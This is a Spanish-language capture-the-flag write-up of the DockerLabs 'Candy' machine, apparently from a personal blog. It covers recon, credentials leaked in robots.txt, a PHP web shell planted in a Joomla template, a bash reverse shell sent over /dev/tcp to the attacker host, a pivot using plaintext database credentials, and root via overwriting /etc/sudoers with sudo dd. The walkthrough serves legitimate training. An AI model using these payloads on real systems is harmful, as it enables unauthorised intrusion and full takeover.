---
title: Candy
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-06-02
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-candy/candy_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - http
  - php
  - data leaks
  - rce
  - interactive tty
  - sudo abuse
  - information gathering
  - web analysis
  - vulnerability exploitation
  - data leak exploitation
  - lateral movement
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/candy:-$ ping -c 1 172.17.0.3
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.031 ms

--- 172.17.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/candy:-$ nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.3 -n -Pn -oG nmap1
Host: 172.17.0.3 ()	Status: Up
Host: 172.17.0.3 ()	Ports: 80/open/tcp//http///	Ignored State: closed (65534)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/candy:-$ nmap -sCV -vvv -p80 172.17.0.3 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Home
| http-robots.txt: 17 disallowed entries 
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
| /language/ /layouts/ /un_caramelo /libraries/ /logs/ /modules/ 
|_/plugins/ /tmp/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
MAC Address: C2:69:9F:C8:16:21 (Unknown)
```

```terminal
/home/kali/Documents/dockerlabs/candy:-$ whatweb 172.17.0.3
http://172.17.0.3 [200 OK] Apache[2.4.58], Cookies[67f8fae1a4d19f3cd42b155a572e08c4], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], HttpOnly[67f8fae1a4d19f3cd42b155a572e08c4], IP[172.17.0.3], MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN]
```

---
## Web Analysis & Data Leak Exploitation

Identifico un servicio web activo sobre Apache 2.4.58 en un entorno Ubuntu. El header indica que el sitio está construido con Joomla. Al acceder a la página principal, se presenta un formulario de autenticación.

![](assets/img/dockerlabs-writeup-candy/candy1_1.png)

Enumerando archivos comunes descubro la presencia de `/robots.txt`, que revela múltiples rutas internas y sensibles, incluyendo `/administrator/`.

![](assets/img/dockerlabs-writeup-candy/candy1_2.png)

Al final del archivo, aparece una línea con lo que parecen ser credenciales `admin:c2FubHVpczEyMzQ1` la ultima cadena se encuentra en base64 que, al decodificarla, revela la contraseña del usuario `admin`.

```terminal
/home/kali/Documents/dockerlabs/candy:-$ echo -n 'c2FubHVpczEyMzQ1' | base64 -d
sanluis12345
```

Ahora si, utilizo las credenciales `admin`:`sanluis12345` para iniciar sesión en el panel de administración de Joomla accesible desde `/administrator/`

![](assets/img/dockerlabs-writeup-candy/candy1_3.png)
![](assets/img/dockerlabs-writeup-candy/candy1_4.png)

---
## Vulnerability Exploitation

Con acceso administrativo al panel de Joomla, aprovecho la funcionalidad de edición de plantillas para ejecutar comandos arbitrarios. Desde el menú `System > Site Templates > Cassiopeia Details and Files > component.php` edito el archivo e inserto código PHP, `system($_GET['cmd']);`.

{% include embed/video.html src='assets/img/dockerlabs-writeup-candy/candy1_5.webm' types='webm' title='Foothold' autoplay=true loop=true muted=true %}

Escucho conexiones entrantes con netcat en el puerto 4321.

```terminal
/home/kali/Documents/dockerlabs/candy:-$ nc -lnvp 4321
	listening on [any] 4321 ...
```

Luego disparo la carga útil para enviarme una conexion reversa.

```terminal
/home/kali/Documents/dockerlabs/candy:-$ curl http://172.17.0.3/templates/cassiopeia/component.php\?cmd\=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.2%2F4321%200%3E%261%22

	... connect to [172.17.0.2] from (UNKNOWN) [172.17.0.3] 53364.

www-data@66b028a2a370:/var/www/html/joomla/templates/cassiopeia$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

Restauro el entorno interactivo para mejorar la visibilidad y control de la shell.

```terminal
www-data@90d89cd7471b:/var/www/html/joomla/templates/cassiopeia$ script /dev/null -c bash 
www-data@90d89cd7471b:/var/www/html/joomla/templates/cassiopeia$ ^Z 

/home/kali/Documents/dockerlabs/candy:-$ stty raw -echo;fg 
[1]  + continued  nc -nvlp 4321
				reset xterm
www-data@90d89cd7471b:/var/www/html/joomla/templates/cassiopeia$ export TERM=xterm
www-data@90d89cd7471b:/var/www/html/joomla/templates/cassiopeia$ export SHELL=bash 
www-data@90d89cd7471b:/var/www/html/joomla/templates/cassiopeia$ stty rows 36 columns 138
```

Consulto el archivo `/etc/passwd` para identificar otros usuarios del sistema, los cuales poseen shells válidos.

```terminal
www-data@66b028a2a370:/var/www/html$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
luisillo:x:1001:1001:,,,:/home/luisillo:/bin/bash
```

Realizo una búsqueda de archivos legibles o pertenecientes al usuario `www-data`, excluyendo rutas irrelevantes. Descubro un archivo inusual, ubicado en `/var/backups/hidden/`.

```terminal
www-data@66b028a2a370:/var/www/html$ find /var -user www-data -o -perm -o=r 2>/dev/null | grep -v '/joomla/\|/lib/\|/cache/\|/log/'
/var
/var/spool
/var/spool/mail
/var/log
/var/tmp
/var/lock
/var/cache
/var/lib
/var/opt
/var/run
/var/local
/var/backups
/var/backups/hidden
/var/backups/hidden/otro_caramelo.txt
/var/mail
/var/www
/var/www/html
/var/www/html/joomla
/var/www/html/index.html
```

El archivo `/var/backups/hidden/otro_caramelo.txt` contiene credenciales en texto plano correspondientes al usuario `luisillo`, utilizados por Joomla para conectarse a la base de datos local.

```terminal
www-data@66b028a2a370:/var/www/html$ cat /var/backups/hidden/otro_caramelo.txt
...[snip]...
// Información sensible
$db_host = 'localhost';
$db_user = 'luisillo';
$db_pass = 'luisillosuperpassword';
$db_name = 'joomla_db';
...[snip]...
```

Accedo exitosamente como `luisillo` utilizando las credenciales extraídas.

```terminal
www-data@66b028a2a370:/var/www/html$ su luisillo
Password: luisillosuperpassword

luisillo@66b028a2a370:/var/www/html$ id
uid=1001(luisillo) gid=1001(luisillo) groups=1001(luisillo),100(users)
```

---
## Privilege Escalation

Listando los binarios disponibles con privilegios `sudo` para el usuario `luisillo`, se encuentra que puede ejecutar `/bin/dd` sin necesidad de contraseña.

```terminal
luisillo@66b028a2a370:~$ sudo -l
Matching Defaults entries for luisillo on 66b028a2a370:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 66b028a2a370:
    (ALL) NOPASSWD: /bin/dd
```

Según [GTFOBins](https://gtfobins.github.io/gtfobins/dd/#sudo), `dd` permite redirigir contenido hacia archivos arbitrarios con permisos de `root`. Esto habilita la posibilidad de sobreescribir `/etc/sudoers` para escalar privilegios, sin requerir ejecución de binarios adicionales.

```terminal
luisillo@66b028a2a370:~$ LFILE=/etc/sudoers

luisillo@90d89cd7471b:~$ echo 'luisillo ALL=(ALL:ALL) ALL' | sudo /bin/dd of=$LFILE
0+1 records in
0+1 records out
27 bytes copied, 3.1509e-05 s, 857 kB/s
```

Una vez modificada la política, es posible utilizar `sudo` de manera convencional sin restricción y acceder a una shell como `root`.

```terminal
luisillo@90d89cd7471b:~$ sudo su
[sudo] password for luisillo: luisillosuperpassword

root@90d89cd7471b:/home/luisillo# id
uid=0(root) gid=0(root) groups=0(root)
```
